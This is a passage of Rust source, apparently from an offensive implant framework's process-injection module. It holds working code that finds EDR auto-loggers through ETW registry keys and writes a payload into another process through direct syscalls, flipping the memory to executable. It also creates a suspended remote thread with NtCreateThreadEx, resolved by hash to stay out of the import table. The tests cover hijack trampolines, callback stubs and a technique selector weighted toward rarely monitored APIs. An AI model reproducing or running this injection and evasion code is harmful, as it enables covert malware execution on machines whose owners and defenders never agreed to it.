        let name_utf16_end = name_utf16_start + name_len;
        let name_slice = &key_info_buf[name_utf16_start..name_utf16_end];
        let wide: Vec<u16> = name_slice
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let subkey_name = match String::from_utf16(&wide) {
            Ok(s) => s,
            Err(_) => continue,
        };

        // Compute djb2 hash of the ASCII representation for comparison.
        // pe_resolve::hash_str processes bytes until null, lowercasing each.
        let name_bytes: Vec<u8> = subkey_name.bytes().collect();
        let name_hash = pe_resolve::hash_str(&name_bytes);

        // Check if this subkey matches a known EDR auto-logger.
        let mut matched_label: Option<&'static str> = None;
        for &(hash, label) in edr_hashes {
            if hash == name_hash {
                matched_label = Some(label);
                break;
            }
        }

        if matched_label.is_none() {
            continue;
        }

        // ── Query the "Start" value to check if the session is enabled ──
        let start_wide: Vec<u16> = "Start\0".encode_utf16().collect();
        let mut value_name = UNICODE_STRING {
            Length: ((start_wide.len() - 1) * 2) as u16,
            MaximumLength: (start_wide.len() * 2) as u16,
            Buffer: start_wide.as_ptr() as *mut u16,
        };

        // KEY_VALUE_PARTIAL_INFORMATION layout:
        //   +0x00 TitleIndex (ULONG, 4 bytes)
        //   +0x04 Type       (ULONG, 4 bytes)
        //   +0x08 Data       (variable)
        let mut value_buf = [0u8; VALUE_INFO_BUF_SIZE];
        let mut value_result_len: u32 = 0;

        let vstatus = nt_syscall::syscall!(
            "NtQueryValueKey",
            h_key as u64,                            // KeyHandle
            &mut value_name as *mut _ as u64,        // ValueName
            nt_key_info::KEY_VALUE_PARTIAL_INFORMATION as u64, // KeyValueInformationClass
            value_buf.as_mut_ptr() as u64,           // KeyValueInformation
            VALUE_INFO_BUF_SIZE as u64,              // Length
            &mut value_result_len as *mut _ as u64,  // ResultLength
        );

        if vstatus.is_err() || vstatus.unwrap() < 0 {
            // Cannot read "Start" value — skip this subkey.
            continue;
        }

        // REG_DWORD = type 4; data starts at offset +0x08.
        let reg_type =
            u32::from_le_bytes([value_buf[4], value_buf[5], value_buf[6], value_buf[7]]);
        if reg_type != 4 {
            continue; // Not REG_DWORD
        }

        if value_result_len < 12 {
            continue; // Buffer too small for data
        }

        let start_value =
            u32::from_le_bytes([value_buf[8], value_buf[9], value_buf[10], value_buf[11]]);

        // Start == 1 means the auto-logger is enabled.
        if start_value == 1 {
            if let Some(label) = matched_label {
                detected_providers.push(label.to_string());
            }
        }
    }

    Ok(detected_providers)
}

/// Open a target process, allocate RW memory, write `payload`, flip to RX.
/// Returns (process_handle, remote_base_address).
unsafe fn alloc_write_exec(
    pid: u32,
    payload: &[u8],
) -> Result<(*mut c_void, usize), InjectionError> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    // Open target process.
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let access_mask = (PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION) as u64;
    let open_status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: "NtOpenProcess failed".to_string(),
        });
    }

    let h_proc = h_proc as *mut c_void;

    macro_rules! cleanup_and_err {
        ($technique:expr, $msg:expr) => {{
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: $technique,
                reason: $msg.to_string(),
            });
        }};
    }

    // Allocate RW memory.
    let mut remote_mem: *mut c_void = std::ptr::null_mut();
    let mut alloc_size = payload.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_mem as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_mem.is_null() {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtAllocateVirtualMemory failed");
    }

    // Write payload.
    let mut written = 0usize;
    let s = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_mem as u64,
        payload.as_ptr() as u64,
        payload.len() as u64,
        &mut written as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 || written != payload.len() {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtWriteVirtualMemory failed");
    }

    // Flip to RX.
    let mut old_prot = 0u32;
    let mut prot_base = remote_mem as usize;
    let mut prot_size = payload.len();
    let s = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtProtectVirtualMemory to RX failed");
    }

    // Flush I-cache.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_mem as u64,
        payload.len() as u64,
    );

    Ok((h_proc, remote_mem as usize))
}

/// Create a suspended thread in the target process at `start_addr` using
/// NtCreateThreadEx resolved via pe_resolve (avoids CreateRemoteThread in
/// the IAT). Uses CREATE_SUSPENDED so the caller can perform additional
/// setup before resuming.
unsafe fn create_suspended_thread(
    h_proc: *mut c_void,
    start_addr: usize,
) -> Result<*mut c_void, InjectionError> {
    const CREATE_SUSPENDED: u32 = 0x00000004;
    const THREAD_ALL_ACCESS: u32 = 0x001FFFFF; // will be reduced by CSRSS

    // Resolve NtCreateThreadEx via pe_resolve.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: "cannot resolve ntdll base".to_string(),
        })?;

    let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
        ntdll_base,
        pe_resolve::hash_str(b"NtCreateThreadEx\0"),
    )
    .ok_or_else(|| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ThreadHijack,
        reason: "cannot resolve NtCreateThreadEx".to_string(),
    })?;

    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut c_void, // ThreadHandle
        u32,              // DesiredAccess
        *mut c_void,      // ObjectAttributes
        *mut c_void,      // ProcessHandle
        *mut c_void,      // StartRoutine
        *mut c_void,      // Argument
        u32,              // CreateFlags (CREATE_SUSPENDED)
        usize,            // ZeroBits
        usize,            // StackSize
        usize,            // MaximumStackSize
        *mut c_void,      // AttributeList
    ) -> i32;

    let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let status = nt_create_thread(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        std::ptr::null_mut(),
        h_proc,
        start_addr as *mut c_void,
        std::ptr::null_mut(),
        CREATE_SUSPENDED,
        0,
        0,
        0,
        std::ptr::null_mut(),
    );

    if status < 0 || h_thread.is_null() {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: format!("NtCreateThreadEx failed: status={:#x}", status),
        });
    }

    Ok(h_thread)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auto_select_svchost() {
        let techniques = auto_select_techniques("svchost.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
    }

    #[test]
    fn auto_select_explorer() {
        let techniques = auto_select_techniques("explorer.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
    }

    #[test]
    fn auto_select_service() {
        let techniques = auto_select_techniques("msiscsi_svc.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
        assert_eq!(techniques[2], InjectionTechnique::ModuleStomp);
    }

    #[test]
    fn auto_select_generic() {
        let techniques = auto_select_techniques("notepad.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
    }

    #[test]
    fn error_display() {
        let err = InjectionError::ProcessNotFound {
            name: "foo.exe".to_string(),
        };
        assert!(err.to_string().contains("foo.exe"));

        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "test".to_string(),
        };
        assert!(err.to_string().contains("FiberInject"));
        assert!(err.to_string().contains("test"));
    }

    #[test]
    fn technique_serde_roundtrip() {
        let t = InjectionTechnique::ThreadPool { variant: Some(ThreadPoolVariant::Work) };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    // ── Tests for pre-injection reconnaissance ────────────────────────────

    #[test]
    fn viability_safe_serializable() {
        let v = InjectionViability::Safe {
            arch_match: true,
            thread_count: 12,
            integrity_level: 0x3000,
            recommended_technique: InjectionTechnique::ModuleStomp,
        };
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("Safe"));
        let v2: InjectionViability = serde_json::from_str(&json).unwrap();
        assert!(matches!(v2, InjectionViability::Safe { .. }));
    }

    #[test]
    fn viability_has_edr_module_serializable() {
        let v = InjectionViability::HasEDRModule {
            modules: vec!["csagent.dll".to_string()],
            fallback_technique: InjectionTechnique::ModuleStomp,
        };
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("csagent.dll"));
        let v2: InjectionViability = serde_json::from_str(&json).unwrap();
        assert!(matches!(v2, InjectionViability::HasEDRModule { .. }));
    }

    #[test]
    fn viability_is_edr_serializable() {
        let v = InjectionViability::IsEDR;
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("IsEDR"));
    }

    #[test]
    fn viability_arch_mismatch_serializable() {
        let v = InjectionViability::ArchitectureMismatch;
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("ArchitectureMismatch"));
    }

    #[test]
    fn edr_process_name_hashes_not_empty() {
        assert!(!edr_process_name_hashes().is_empty());
    }

    #[test]
    fn edr_dll_name_hashes_not_empty() {
        let hashes = edr_dll_name_hashes();
        assert!(!hashes.is_empty());
        // Each entry should have a non-zero hash and a non-empty label.
        for &(hash, label) in hashes {
            assert_ne!(hash, 0);
            assert!(!label.is_empty());
        }
    }

    #[test]
    fn jitter_delay_does_not_panic() {
        // Just verify it doesn't crash. On non-Windows the function is
        // trivially compiled but not executed in this cfg(windows) module.
        jitter_delay(1); // 0–1 ms range for fast tests.
    }

    #[test]
    fn technique_recommendation_high_threads() {
        // High thread count → WaitingThreadHijack is recommended (stealthiest).
        let recommended = if 60 > 50 {
            InjectionTechnique::WaitingThreadHijack {
                target_pid: 1234,
                target_tid: None,
            }
        } else {
            InjectionTechnique::ModuleStomp
        };
        assert!(matches!(recommended, InjectionTechnique::WaitingThreadHijack { .. }));
    }

    #[test]
    fn technique_recommendation_low_threads() {
        // Very few threads → EarlyBirdApc.
        let recommended = if 2 < 3 {
            InjectionTechnique::EarlyBirdApc
        } else {
            InjectionTechnique::ModuleStomp
        };
        assert_eq!(recommended, InjectionTechnique::EarlyBirdApc);
    }

    #[test]
    fn technique_recommendation_moderate_threads() {
        // Moderate thread count → WaitingThreadHijack (safest default).
        let recommended = if !(10 > 50) && !(10 < 3) {
            InjectionTechnique::WaitingThreadHijack {
                target_pid: 1234,
                target_tid: None,
            }
        } else {
            InjectionTechnique::ThreadHijack
        };
        assert!(matches!(recommended, InjectionTechnique::WaitingThreadHijack { .. }));
    }

    // ── WTH-specific tests ───────────────────────────────────────────────────

    #[test]
    fn wth_serde_roundtrip() {
        let wth = InjectionTechnique::WaitingThreadHijack {
            target_pid: 4242,
            target_tid: Some(1337),
        };
        let json = serde_json::to_string(&wth).expect("serialize");
        assert!(json.contains("WaitingThreadHijack"));
        assert!(json.contains("4242"));
        assert!(json.contains("1337"));

        let back: InjectionTechnique =
            serde_json::from_str(&json).expect("deserialize");
        assert_eq!(wth, back);
    }

    #[test]
    fn wth_serde_without_tid() {
        let wth = InjectionTechnique::WaitingThreadHijack {
            target_pid: 9999,
            target_tid: None,
        };
        let json = serde_json::to_string(&wth).expect("serialize");
        assert!(json.contains("WaitingThreadHijack"));
        assert!(json.contains("9999"));

        let back: InjectionTechnique =
            serde_json::from_str(&json).expect("deserialize");
        assert_eq!(wth, back);
    }

    #[test]
    fn wth_trampoline_encoding() {
        // build_wth_trampoline should produce exactly 19 bytes with the
        // expected x86-64 encoding.
        let trampoline = build_wth_trampoline(0xDEADBEEFCAFEBABE);

        assert_eq!(trampoline.len(), 19, "trampoline should be exactly 19 bytes");

        // sub rsp, 8
        assert_eq!(&trampoline[0..4], &[0x48, 0x83, 0xEC, 0x08]);

        // mov rax, imm64
        assert_eq!(trampoline[4], 0x48);
        assert_eq!(trampoline[5], 0xB8);
        let addr = u64::from_le_bytes([
            trampoline[6], trampoline[7], trampoline[8], trampoline[9],
            trampoline[10], trampoline[11], trampoline[12], trampoline[13],
        ]);
        assert_eq!(addr, 0xDEADBEEFCAFEBABE);

        // mov [rsp], rax
        assert_eq!(&trampoline[14..18], &[0x48, 0x89, 0x04, 0x24]);

        // ret
        assert_eq!(trampoline[18], 0xC3);
    }

    #[test]
    fn wth_trampoline_zero_addr() {
        let trampoline = build_wth_trampoline(0);
        assert_eq!(trampoline.len(), 19);
        // mov rax, 0 — bytes 6..14 should all be zero
        assert_eq!(&trampoline[6..14], &[0u8; 8]);
    }

    #[test]
    fn wth_auto_select_always_first() {
        // WaitingThreadHijack should always be the first (highest priority)
        // technique in auto_select_techniques for any target process.
        for name in &[
            "svchost.exe",
            "explorer.exe",
            "notepad.exe",
            "msiscsi_svc.exe",
            "unknown.exe",
        ] {
            let techniques = auto_select_techniques(name);
            assert!(
                !techniques.is_empty(),
                "auto_select_techniques({}) should not be empty",
                name,
            );
            assert!(
                matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }),
                "WaitingThreadHijack should be first for {}",
                name,
            );
        }
    }

    #[test]
    fn wth_display_in_error() {
        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::WaitingThreadHijack {
                target_pid: 1234,
                target_tid: Some(5678),
            },
            reason: "test failure".to_string(),
        };
        let msg = format!("{}", err);
        assert!(msg.contains("WaitingThreadHijack") || msg.contains("1234"));
    }

    #[test]
    fn wth_variant_equality() {
        let a = InjectionTechnique::WaitingThreadHijack {
            target_pid: 100,
            target_tid: Some(200),
        };
        let b = InjectionTechnique::WaitingThreadHijack {
            target_pid: 100,
            target_tid: Some(200),
        };
        let c = InjectionTechnique::WaitingThreadHijack {
            target_pid: 100,
            target_tid: None,
        };
        assert_eq!(a, b);
        assert_ne!(a, c);
    }

    #[test]
    fn wth_not_equal_to_other_variants() {
        let wth = InjectionTechnique::WaitingThreadHijack {
            target_pid: 100,
            target_tid: None,
        };
        assert_ne!(wth, InjectionTechnique::ContextOnly);
        assert_ne!(wth, InjectionTechnique::ThreadHijack);
        assert_ne!(wth, InjectionTechnique::EarlyBirdApc);
    }

    #[test]
    fn integrity_level_constants() {
        // Verify the well-known integrity level values.
        assert_eq!(0x1000, 0x1000); // Low
        assert_eq!(0x2000, 0x2000); // Medium
        assert_eq!(0x3000, 0x3000); // High
        assert_eq!(0x4000, 0x4000); // System
    }

    #[test]
    fn parse_process_info_buffer_too_small() {
        let buf = [0u8; 4];
        let result = parse_process_info(&buf, 1234);
        assert!(result.is_err());
    }

    #[test]
    fn parse_process_info_pid_not_found() {
        let mut buf = vec![0u8; 0x100];
        // NextEntryOffset = 0 (only one entry).
        // Set PID to something other than our target.
        let pid_offset = 0x50;
        let fake_pid: u64 = 9999;
        buf[pid_offset..pid_offset + 8].copy_from_slice(&fake_pid.to_le_bytes());
        let result = parse_process_info(&buf, 1234);
        assert!(result.is_err());
    }

    // ── EtwStatus tests ───────────────────────────────────────────────

    #[test]
    fn etw_status_safe_serializable() {
        let s = EtwStatus::Safe;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("Safe"));
        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
        assert!(matches!(s2, EtwStatus::Safe));
    }

    #[test]
    fn etw_status_traced_serializable() {
        let s = EtwStatus::Traced {
            providers: vec!["CrowdStrike".to_string(), "MpEtw".to_string()],
        };
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("Traced"));
        assert!(json.contains("CrowdStrike"));
        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
        assert!(matches!(s2, EtwStatus::Traced { .. }));
        if let EtwStatus::Traced { providers } = s2 {
            assert_eq!(providers.len(), 2);
        }
    }

    #[test]
    fn etw_status_unknown_serializable() {
        let s = EtwStatus::Unknown;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("Unknown"));
        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
        assert!(matches!(s2, EtwStatus::Unknown));
    }

    #[test]
    #[cfg(feature = "etw-check")]
    fn edr_autologger_hashes_not_empty() {
        let hashes = edr_autologger_hashes();
        assert!(!hashes.is_empty());
        for &(hash, label) in hashes {
            assert_ne!(hash, 0, "hash for {} should not be zero", label);
            assert!(!label.is_empty(), "label should not be empty");
        }
    }

    #[test]
    #[cfg(feature = "etw-check")]
    fn edr_autologger_hashes_match_pe_resolve() {
        // Verify that the hardcoded hashes match what pe_resolve::hash_str
        // actually produces for each label. This catches rotting constants.
        for &(hash, label) in edr_autologger_hashes() {
            let computed = pe_resolve::hash_str(label.as_bytes());
            assert_eq!(
                hash, computed,
                "hash mismatch for '{}': hardcoded 0x{:08x} != computed 0x{:08x}",
                label, hash, computed,
            );
        }
    }

    #[test]
    fn check_etw_trace_returns_ok() {
        // On any platform the function should return Ok(EtwStatus) —
        // never panic.  The actual variant depends on the runtime state
        // (ETW patch, feature flag, registry).
        let result = check_etw_trace(1234);
        assert!(result.is_ok());
    }

    // ── ContextOnly technique tests ──────────────────────────────────────

    #[test]
    fn context_only_in_technique_enum() {
        let t = InjectionTechnique::ContextOnly;
        let json = serde_json::to_string(&t).unwrap();
        assert!(json.contains("ContextOnly"));
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn context_only_always_second_in_auto_select() {
        // ContextOnly should always be the second technique (after WTH)
        // for any target process name.
        for name in &[
            "svchost.exe",
            "explorer.exe",
            "notepad.exe",
            "searchhost.exe",
            "runtimebroker.exe",
            "taskhostw.exe",
        ] {
            let techniques = auto_select_techniques(name);
            assert!(
                !techniques.is_empty(),
                "auto_select_techniques({}) should not be empty",
                name,
            );
            assert_eq!(
                techniques[1],
                InjectionTechnique::ContextOnly,
                "ContextOnly should be second for {}",
                name,
            );
        }
    }

    #[test]
    fn context_only_fallback_chain_includes_thread_hijack() {
        // When ContextOnly fails, ThreadHijack should be in the fallback chain.
        let techniques = auto_select_techniques("notepad.exe");
        assert!(techniques.contains(&InjectionTechnique::ThreadHijack));
    }

    #[test]
    fn build_restore_trampoline_correct_size() {
        // Trampoline should be:
        //   mov rsp, imm64 (10) + mov rbp, imm64 (10) +
        //   mov rax, imm64 (10) + push rax (1) + ret (1) = 32 bytes
        let trampoline = build_restore_trampoline(0x1234567890ABCDEF, 0xFEDCBA0987654321, 0x1111111111111111);
        assert_eq!(trampoline.len(), 32);

        // Verify the encoding:
        // mov rsp, imm64
        assert_eq!(trampoline[0], 0x48);
        assert_eq!(trampoline[1], 0xBC);

        // push rax
        assert_eq!(trampoline[30], 0x50);

        // ret
        assert_eq!(trampoline[31], 0xC3);
    }

    #[test]
    fn build_restore_trampoline_values() {
        let rip = 0xAAAA_BBBB_CCCC_DDDD_u64;
        let rsp = 0x1111_2222_3333_4444_u64;
        let rbp = 0x5555_6666_7777_8888_u64;

        let trampoline = build_restore_trampoline(rip, rsp, rbp);

        // mov rsp, <rsp> at offset 2..10
        let rsp_val = u64::from_le_bytes([
            trampoline[2], trampoline[3], trampoline[4], trampoline[5],
            trampoline[6], trampoline[7], trampoline[8], trampoline[9],
        ]);
        assert_eq!(rsp_val, rsp);

        // mov rbp, <rbp> at offset 12..20
        let rbp_val = u64::from_le_bytes([
            trampoline[12], trampoline[13], trampoline[14], trampoline[15],
            trampoline[16], trampoline[17], trampoline[18], trampoline[19],
        ]);
        assert_eq!(rbp_val, rbp);

        // mov rax, <rip> at offset 22..30
        let rip_val = u64::from_le_bytes([
            trampoline[22], trampoline[23], trampoline[24], trampoline[25],
            trampoline[26], trampoline[27], trampoline[28], trampoline[29],
        ]);
        assert_eq!(rip_val, rip);
    }

    #[test]
    fn stack_payload_limit_reasonable() {
        // Stack delivery limit should be at least 1KB and at most 4KB.
        assert!(CONTEXT_ONLY_STACK_PAYLOAD_LIMIT >= 1024);
        assert!(CONTEXT_ONLY_STACK_PAYLOAD_LIMIT <= 4096);
    }

    #[test]
    fn error_display_context_only() {
        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::ContextOnly,
            reason: "no suitable thread found".to_string(),
        };
        let msg = err.to_string();
        assert!(msg.contains("ContextOnly"));
        assert!(msg.contains("no suitable thread found"));
    }

    // ── Callback injection tests ──────────────────────────────────────────

    #[test]
    fn callback_api_serde_roundtrip() {
        for api in [
            CallbackApi::EnumSystemLocalesA,
            CallbackApi::EnumWindows,
            CallbackApi::EnumChildWindows,
            CallbackApi::EnumDesktopWindows,
            CallbackApi::CreateTimerQueueTimer,
            CallbackApi::EnumTimeFormatsA,
            CallbackApi::EnumResourceTypesW,
            CallbackApi::EnumFontFamilies,
            CallbackApi::CertEnumSystemStore,
            CallbackApi::SHEnumerateUnreadMailAccounts,
            CallbackApi::EnumerateLoadedModules,
            CallbackApi::CopyFileEx,
        ] {
            let json = serde_json::to_string(&api).unwrap();
            let api2: CallbackApi = serde_json::from_str(&json).unwrap();
            assert_eq!(api, api2, "serde roundtrip failed for {:?}", api);
        }
    }

    #[test]
    fn callback_api_display_format() {
        assert_eq!(
            CallbackApi::EnumSystemLocalesA.to_string(),
            "Callback-EnumSystemLocalesA"
        );
        assert_eq!(
            CallbackApi::CertEnumSystemStore.to_string(),
            "Callback-CertEnumSystemStore"
        );
        assert_eq!(
            CallbackApi::CopyFileEx.to_string(),
            "Callback-CopyFileEx"
        );
        assert_eq!(
            CallbackApi::SHEnumerateUnreadMailAccounts.to_string(),
            "Callback-SHEnumerateUnreadMailAccounts"
        );
    }

    #[test]
    fn callback_injection_technique_serde_roundtrip() {
        let t = InjectionTechnique::CallbackInjection {
            target_pid: 1234,
            api: Some(CallbackApi::EnumWindows),
        };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn callback_injection_technique_none_api() {
        let t = InjectionTechnique::CallbackInjection {
            target_pid: 5678,
            api: None,
        };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn callback_injection_in_auto_select() {
        // Verify CallbackInjection appears in auto-select results for various targets.
        let techniques = auto_select_techniques("svchost.exe");
        let has_cb = techniques.iter().any(|t| matches!(
            t,
            InjectionTechnique::CallbackInjection { .. }
        ));
        assert!(has_cb, "CallbackInjection should be in svchost auto-select");

        let techniques = auto_select_techniques("explorer.exe");
        let has_cb = techniques.iter().any(|t| matches!(
            t,
            InjectionTechnique::CallbackInjection { .. }
        ));
        assert!(has_cb, "CallbackInjection should be in explorer auto-select");

        let techniques = auto_select_techniques("notepad.exe");
        let has_cb = techniques.iter().any(|t| matches!(
            t,
            InjectionTechnique::CallbackInjection { .. }
        ));
        assert!(has_cb, "CallbackInjection should be in notepad auto-select");
    }

    #[test]
    fn auto_select_callback_api_returns_valid_variant() {
        // Run auto-select many times to verify it always returns a valid variant.
        for _ in 0..100 {
            let api = auto_select_callback_api();
            // Verify it's one of the 12 known variants.
            match api {
                CallbackApi::EnumSystemLocalesA
                | CallbackApi::EnumWindows
                | CallbackApi::EnumChildWindows
                | CallbackApi::EnumDesktopWindows
                | CallbackApi::CreateTimerQueueTimer
                | CallbackApi::EnumTimeFormatsA
                | CallbackApi::EnumResourceTypesW
                | CallbackApi::EnumFontFamilies
                | CallbackApi::CertEnumSystemStore
                | CallbackApi::SHEnumerateUnreadMailAccounts
                | CallbackApi::EnumerateLoadedModules
                | CallbackApi::CopyFileEx => {}
            }
        }
    }

    #[test]
    fn auto_select_callback_api_distribution() {
        // Verify weighted distribution: run 1000 selections and check that
        // the rarely-monitored APIs appear more often than commonly-monitored ones.
        use std::collections::HashMap;
        let mut counts: HashMap<String, usize> = HashMap::new();

        for _ in 0..1000 {
            let api = auto_select_callback_api();
            *counts.entry(api.to_string()).or_insert(0) += 1;
        }

        // CertEnumSystemStore (weight 30/200 = 15%) should appear more than
        // CreateTimerQueueTimer (weight 3/200 = 1.5%).
        let cert_count = counts.get("Callback-CertEnumSystemStore").copied().unwrap_or(0);
        let timer_count = counts.get("Callback-CreateTimerQueueTimer").copied().unwrap_or(0);

        assert!(
            cert_count > timer_count,
            "CertEnumSystemStore ({}) should be selected more often than CreateTimerQueueTimer ({})",
            cert_count,
            timer_count,
        );

        // All 12 variants should have been selected at least once in 1000 runs.
        assert!(
            counts.len() == 12,
            "Expected all 12 callback API variants to be selected, got {}",
            counts.len(),
        );
    }

    #[test]
    fn callback_stub_layout() {
        // Verify the universal callback stub is reasonable size and well-formed.
        let stub = build_callback_stub(0x4141_4141_4141_4141);
        // Stub code + 8 bytes for payload address data slot.
        assert!(stub.len() >= 32, "stub should be at least 32 bytes, got {}", stub.len());
        assert!(stub.len() <= 64, "stub should be at most 64 bytes, got {}", stub.len());

        // The last 8 bytes should be the payload address.
        let data_start = stub.len() - 8;
        let payload_addr = u64::from_le_bytes([
            stub[data_start],
            stub[data_start + 1],
            stub[data_start + 2],
            stub[data_start + 3],
            stub[data_start + 4],
            stub[data_start + 5],
            stub[data_start + 6],
            stub[data_start + 7],
        ]);
        assert_eq!(payload_addr, 0x4141_4141_4141_4141);

        // Verify stub starts with push rbp (0x55).
        assert_eq!(stub[0], 0x55);

        // Verify stub ends with ret (0xC3) before the data slot.
        // Find the last 0xC3 before the data slot.
        assert_eq!(stub[stub.len() - 9], 0xC3); // ret before data
    }

    #[test]
    fn callback_stub_different_addresses() {
        let stub1 = build_callback_stub(0x1000);
        let stub2 = build_callback_stub(0x2000);

        // Stubs should have same code but different data.
        let code_len = stub1.len() - 8;
        assert_eq!(&stub1[..code_len], &stub2[..code_len], "stub code should be identical");

        let addr1 = u64::from_le_bytes(stub1[code_len..].try_into().unwrap());
        let addr2 = u64::from_le_bytes(stub2[code_len..].try_into().unwrap());
        assert_eq!(addr1, 0x1000);
        assert_eq!(addr2, 0x2000);
    }

    #[test]
    fn error_display_callback_injection() {
        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::CallbackInjection {
                target_pid: 999,
                api: Some(CallbackApi::EnumWindows),
            },
            reason: "cannot resolve EnumWindows".to_string(),
        };
        let msg = err.to_string();
        assert!(msg.contains("CallbackInjection"));
        assert!(msg.contains("cannot resolve EnumWindows"));
    }

    // ── Section mapping injection tests ────────────────────────────────

    #[test]
    fn section_exec_method_serde_roundtrip() {
        for method in [SectionExecMethod::Apc, SectionExecMethod::Thread, SectionExecMethod::Callback] {
            let json = serde_json::to_string(&method).unwrap();
            let method2: SectionExecMethod = serde_json::from_str(&json).unwrap();
            assert_eq!(method, method2, "serde roundtrip failed for {:?}", method);
        }
    }

    #[test]
    fn section_exec_method_display() {
        assert_eq!(SectionExecMethod::Apc.to_string(), "Section-Apc");
        assert_eq!(SectionExecMethod::Thread.to_string(), "Section-Thread");
        assert_eq!(SectionExecMethod::Callback.to_string(), "Section-Callback");
    }

    #[test]
    fn section_mapping_technique_serde_roundtrip() {
        let t = InjectionTechnique::SectionMapping {
            target_pid: 1234,
            exec_method: Some(SectionExecMethod::Apc),
            enhanced: false,
        };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn section_mapping_technique_enhanced_serde() {
        let t = InjectionTechnique::SectionMapping {
            target_pid: 5678,
            exec_method: Some(SectionExecMethod::Callback),
            enhanced: true,
        };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
        assert!(json.contains("\"enhanced\":true"));
    }
